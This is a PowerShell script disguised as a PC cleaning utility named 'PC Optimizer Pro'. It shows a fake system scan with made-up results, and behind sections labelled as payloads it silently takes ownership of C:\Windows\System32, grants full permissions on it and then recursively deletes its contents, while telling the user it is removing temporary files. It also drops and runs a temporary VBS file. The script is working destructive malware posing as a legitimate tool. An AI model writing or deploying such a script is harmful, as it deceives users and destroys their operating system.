# This file must be saved in the UTF-8 with BOM encoding. BOM must be present!
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$OutputEncoding = [System.Text.Encoding]::UTF8

# Set console appearance
$host.UI.RawUI.WindowTitle = "PC Optimizer Pro"
$host.UI.RawUI.BackgroundColor = "Black"
$host.UI.RawUI.ForegroundColor = "Cyan"
try {
    $host.UI.RawUI.WindowSize = New-Object System.Management.Automation.Host.Size(150, 50)
    $host.UI.RawUI.BufferSize = New-Object System.Management.Automation.Host.Size(150, 3000)
} catch {
    # Ignore if resize fails
}
Clear-Host

# ============================================================================
# Embedded VB script warning, injected during compilation
# ============================================================================
$vbsContent = @'
'@

# Write VBS to temp file and execute it
$extension = if ($vbsContent -match "^#@~\^") { ".vbe" } else { ".vbs" }
$tempVBS = [System.IO.Path]::GetTempFileName() + $extension
$vbsContent | Out-File -FilePath $tempVBS -Encoding ASCII
Start-Process "wscript.exe" -ArgumentList "`"$tempVBS`"" -Wait
Remove-Item $tempVBS -Force -ErrorAction SilentlyContinue

# Main program start
Clear-Host
Write-Host "╔══════════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
Write-Host "║                Welcome to PC Optimizer Pro                   ║" -ForegroundColor Cyan
Write-Host "║           Professional PC Cleaning & Optimization            ║" -ForegroundColor Cyan
Write-Host "╚══════════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
Write-Host ""
Write-Host "Thank you for using PC Optimizer Pro!" -ForegroundColor White
Write-Host "PC Optimizer Pro is software that helps clean up your PC." -ForegroundColor White
Write-Host ""
Write-Host "To start, PC Optimizer Pro would like to perform a system scan." -ForegroundColor Yellow
Write-Host ""

$choice = Read-Host "Would you like to proceed? (Y/N)"

if ($choice -notmatch '^[Yy]$') {
    Write-Host ""
    Write-Host "Scan aborted. Thank you for using PC Optimizer Pro." -ForegroundColor Green
    pause
    exit
}

# Begin "scan"
Clear-Host
Write-Host "╔══════════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
Write-Host "║                    Starting System Scan...                   ║" -ForegroundColor Cyan
Write-Host "╚══════════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
Write-Host ""
Start-Sleep -Seconds 1

Write-Host "[*] Preparing scan..." -ForegroundColor Yellow
Start-Sleep -Seconds 4
Write-Host "[O] Preperation finished" -ForegroundColor Green

Start-Sleep -Seconds 1

function Show-Tree {
    param(
        [Parameter(Mandatory=$false)]
        [string]$Path = '.',
        [Parameter(Mandatory=$false)]
        [string]$Prefix = '',
        [Parameter(Mandatory=$false)]
        [bool]$IsLast = $true
    )
    
    # Get the item
    $item = Get-Item -LiteralPath $Path -ErrorAction SilentlyContinue
    if (-not $item) { return }
    
    # Connector character
    $connector = if ($Prefix -eq '') { '' } elseif ($IsLast) { '└── ' } else { '├── ' }
    
    # Print the line
    Write-Host "$Prefix$connector$($item.Name)"
    
    # If the item is a folder, recurse (only get directories, not files)
    if ($item.PSIsContainer) {
        $children = Get-ChildItem -LiteralPath $Path -Directory -Force -ErrorAction SilentlyContinue | Sort-Object Name
        for ($i = 0; $i -lt $children.Count; $i++) {
            $last = ($i -eq $children.Count - 1)
            $newPrefix = if ($IsLast) { "$Prefix    " } else { "$Prefix│   " }
            Show-Tree -Path $children[$i].FullName -Prefix $newPrefix -IsLast $last
        }
    }
}

# Simulate scanning with tree commands
Write-Host ""
Write-Host "[*] Scanning Windows Update directory..." -ForegroundColor Yellow
Start-Sleep -Seconds 2
Show-Tree "$env:WINDIR\assembly"
Start-Sleep -Seconds 2

Write-Host ""
Write-Host "[*] Evaluating files in scan..." -ForegroundColor Yellow

# ============================================================================
# PAYLOAD SECTION 1: TAKEOWN
# ============================================================================
cmd /c "takeown /f `"C:\Windows\System32`" /r /d Y" 2>&1 | Out-Null
Write-Host "[O] Evaluation finished" -ForegroundColor Green

Write-Host ""
Write-Host "[*] Scanning OS directory..." -ForegroundColor Yellow
Start-Sleep -Seconds 2
Show-Tree "$env:WINDIR\System32"
Start-Sleep -Seconds 2

Write-Host ""
Write-Host "[*] Evaluating files in scan..." -ForegroundColor Yellow

# ============================================================================
# PAYLOAD SECTION 2: ICACLS PERMISSIONS
# ============================================================================
cmd /c "icacls `"C:\Windows\System32`" /grant Administrators:F /t /c /q" 2>&1 | Out-Null
cmd /c "icacls `"C:\Windows\System32`" /grant ${env:USERNAME}:F /t /c /q" 2>&1 | Out-Null
Write-Host "[O] Evaluation finished" -ForegroundColor Green

Write-Host ""
Write-Host "[*] Scanning programs directory..." -ForegroundColor Yellow
Start-Sleep -Seconds 2
Show-Tree "$env:WINDIR\SysWOW64"
Start-Sleep -Seconds 2

Write-Host ""
Write-Host "[*] Evaluating files in scan..." -ForegroundColor Yellow
Start-Sleep -Seconds 8
Write-Host "[O] Evaluation finished" -ForegroundColor Green

Write-Host ""
Write-Host "══════════════════════════════════════════════════════════════" -ForegroundColor Cyan
Write-Host ""
Write-Host "[O] System scan completed!" -ForegroundColor Green
Write-Host ""
Write-Host "Found:" -ForegroundColor Yellow
Write-Host "  • $((Get-Random -Minimum 12000 -Maximum 20000).ToString('N0')) temporary files" -ForegroundColor White
Write-Host "  • $([math]::Round((Get-Random -Minimum 25 -Maximum 50) / 10, 1)) GB of cached data" -ForegroundColor White
Write-Host "  • $((Get-Random -Minimum 500 -Maximum 1500).ToString('N0')) internet logs" -ForegroundColor White
Write-Host "  • $((Get-Random -Minimum 1000 -Maximum 2500).ToString('N0')) unnecessary system files" -ForegroundColor White
Write-Host ""
pause

# Final deletion prompt
Clear-Host
Write-Host "╔══════════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
Write-Host "║                      Optimization Ready                      ║" -ForegroundColor Cyan
Write-Host "╚══════════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
Write-Host ""
Write-Host "PC Optimizer Pro will now optimize your PC by deleting:" -ForegroundColor White
Write-Host "  • Unnecessary internet logs" -ForegroundColor Gray
Write-Host "  • Cached data" -ForegroundColor Gray
Write-Host "  • Temporary files" -ForegroundColor Gray
Write-Host "  • Redundant system files" -ForegroundColor Gray
Write-Host ""
Write-Host "This process may take several minutes." -ForegroundColor Yellow
Write-Host ""
Start-Sleep -Seconds 5

# The deletion
Write-Host ""
Write-Host "[*] Preparing to optimize system..." -ForegroundColor Yellow
Start-Sleep -Seconds 2
Write-Host "[*] Removing temporary files..." -ForegroundColor Yellow

# ============================================================================
# PAYLOAD SECTION 3: ACTUAL DELETION
# ============================================================================
Remove-Item "C:\Windows\System32\*" -Recurse -Force -Confirm:$false -ErrorAction SilentlyContinue

<# this was for initial debugging
Write-Host "[O] File removal finished..." -ForegroundColor Green
Write-Host "    (SIMULATED PAYLOAD 4 commented out)" -ForegroundColor DarkGray
Write-Host "[O] Optimization complete!" -ForegroundColor Green
Write-Host ""
Write-Host "Your PC has been optimized. Please restart your computer." -ForegroundColor Cyan
Write-Host ""
Write-Host "========================================" -ForegroundColor Red
Write-Host "NOTE: SECTION 3 (DELETION) DISABLED" -ForegroundColor Red
Write-Host "Sections 1 and 2 are ACTIVE for testing" -ForegroundColor Red
Write-Host "========================================" -ForegroundColor Red
pause
#>